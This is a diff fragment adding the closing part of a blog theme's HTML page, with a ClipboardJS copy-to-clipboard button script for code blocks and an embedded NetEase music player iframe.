+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
+        src="//music.163.com/outchain/player?type=2&id=22707008&auto=1&height=32"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+  </div>
+</body>
+
+</html>
